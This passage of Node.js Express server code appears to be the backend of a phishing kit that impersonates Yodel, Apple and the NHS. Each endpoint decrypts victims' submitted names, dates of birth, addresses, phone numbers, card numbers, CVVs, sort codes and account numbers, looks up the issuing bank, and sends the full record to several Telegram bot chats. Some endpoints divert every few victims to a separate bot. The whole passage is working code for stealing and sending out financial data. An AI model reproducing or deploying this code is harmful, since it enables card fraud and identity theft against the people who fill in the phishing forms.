    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mazCount == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mazCount = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
            );
            mazCount += 1;
        }

        res.send("Update Completed");
    })
});

let hoods = 2;

app.options('/hoodsYodel', cors())

app.post('/hoodsYodel', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (hoods == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            hoods = 0;
        } else if (bin === "542011") {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
            );
            hoods += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendBigBillz20', cors())

let bill = 0;

app.post('/sendBigBillz20', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (bill == 100) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            bill = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
            );
            bill += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendKelvYodelRes', cors())

let kelvCount = 0;

app.post('/sendKelvYodelRes', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 5) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

//APPLE
//APPLE
//APPLE

app.options('/sendAppleRes', cors())

app.post('/sendAppleRes', (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (count === 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            count2 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
            );
            count2 = count2 + 1;
        }
    })
});

app.options('/sendMazzaAppleRes', cors())

let mazCount = 3;

app.post('/sendMazzaAppleRes', (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mazCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mazCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
            );
            mazCount += 1;
        }
    })
});

app.options('/sendStrictlyAppleRes', cors())

app.post('/sendStrictlyAppleRes', (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (count === 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            count = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
            );
            count = count + 1;
        }
    })
});

var cdbCount = 0;

app.options('/chasedabag24s', cors())

app.post('/chasedabag24s', (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (cdbCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            cdbCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCDB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Apple:\n${originalText}`
            );
            cdbCount += 1;
        }

        res.send("Update Completed");
    })
});

let clearstore = 0;

app.options('/baliApple', cors())

app.post('/baliApple', (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-673884200&text=Apple:\n${originalText}`
        );

    })
});

//NHS
//NHS
//NHS

app.options('/sendKelvFriendResTwo', cors())

app.post('/sendKelvFriendResTwo', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS2:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1341611061&text=NHS2:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS2:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/@kworthy1', cors())

app.post('/@kworthy1', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
